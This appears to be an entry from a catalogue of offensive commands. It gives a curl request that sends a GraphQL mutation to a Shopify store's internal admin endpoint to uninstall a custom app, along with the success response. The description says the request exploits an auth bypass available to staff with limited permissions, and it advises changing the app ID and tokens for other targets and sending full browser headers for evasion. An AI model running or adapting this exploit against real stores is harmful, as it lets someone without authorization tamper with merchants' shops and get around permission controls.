---
id: cmd-shopify-uninstall-custom-app-graphql
data: >-
  curl -X POST
  'https://sardasigni.myshopify.com/admin/internal/web/graphql/core?operation=AccountEdit&type=query'
  -H 'Host: sardasigni.myshopify.com' -H 'Cookie: your cookie' -H
  'Content-Length: 323' -H 'Sec-Ch-Ua: " Not;A Brand";v="99", "Google
  Chrome";v="97", "Chromium";v="97"' -H 'X-Csrf-Token:
  kYepu6d4-IpY0oAVV_tQdJjatNf1RSXYOojo' -H 'Sec-Ch-Ua-Mobile: ?0' -H
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36' -H 'Content-Type:
  application/json' -H 'Accept: application/json' -H 'X-Shopify-Web-Force-Proxy:
  1' -H 'Sec-Ch-Ua-Platform: "Windows"' -H 'Origin:
  https://sardasigni.myshopify.com' -H 'Sec-Fetch-Site: same-origin' -H
  'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Accept-Encoding: gzip,
  deflate' -H 'Accept-Language: en-US,en;q=0.9' -d
  '{"operationName":"UninstallCustomApp","variables":{"appId":"gid://shopify/App/6431859"},"query":"mutation
  UninstallCustomApp($appId: ID!) {\n appUninstall(input: {id: $appId}) {\n app
  {\n id\n __typename\n }\n userErrors {\n field\n message\n __typename\n }\n
  __typename\n }\n}\n"}'
tags:
  - graphql
  - shopify
  - uninstall
type: command
output: >-
  {"data":{"appUninstall":{"app":{"id":"gid:\/\/shopify\/App\/6431859","__typename":"App"},"userErrors":[],"__typename":"AppUninstallPayload"}},"extensions":{"cost":{"requestedQueryCost":10,"actualQueryCost":10,"throttleStatus":{"maximumAvailable":5000.0,"currentlyAvailable":4990,"restoreRate":250.0}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.718Z'
verified: false
validated: true
submitted: true
---
# shopify-uninstall-custom-app-graphql

## Command

```bash
curl -X POST 'https://sardasigni.myshopify.com/admin/internal/web/graphql/core?operation=AccountEdit&type=query' -H 'Host: sardasigni.myshopify.com' -H 'Cookie: your cookie' -H 'Content-Length: 323' -H 'Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"' -H 'X-Csrf-Token: kYepu6d4-IpY0oAVV_tQdJjatNf1RSXYOojo' -H 'Sec-Ch-Ua-Mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'X-Shopify-Web-Force-Proxy: 1' -H 'Sec-Ch-Ua-Platform: "Windows"' -H 'Origin: https://sardasigni.myshopify.com' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -d '{"operationName":"UninstallCustomApp","variables":{"appId":"gid://shopify/App/6431859"},"query":"mutation UninstallCustomApp($appId: ID!) {\n appUninstall(input: {id: $appId}) {\n app {\n id\n __typename\n }\n userErrors {\n field\n message\n __typename\n }\n __typename\n }\n}\n"}'
```

## Description

This curl command sends a GraphQL mutation to uninstall a custom app in Shopify using the UninstallCustomApp operation, exploiting auth bypass with limited staff permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--appId` | Global ID of the target app (e.g., gid://shopify/App/6431859) | Yes |
| `Cookie` | Session cookie for authentication | Yes |
| `X-Csrf-Token` | CSRF protection token | Yes |
| `Host` | Shopify store domain | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=AccountEdit&type=query' [headers] -d '[payload with appId]'
```

### Advanced Usage

Adjust appId and tokens for different targets; include full browser headers for evasion.

## Expected Output

JSON response indicating successful uninstall: {"data":{"appUninstall":{"app":{"id":"gid:\/\/shopify\/App\/6431859","__typename":"App"},"userErrors":[]}}}

## Related

- [[commands/shopify-remove-channel-graphql]]
- [[procedures/Execute-GraphQL-App-Uninstall-Mutation]]
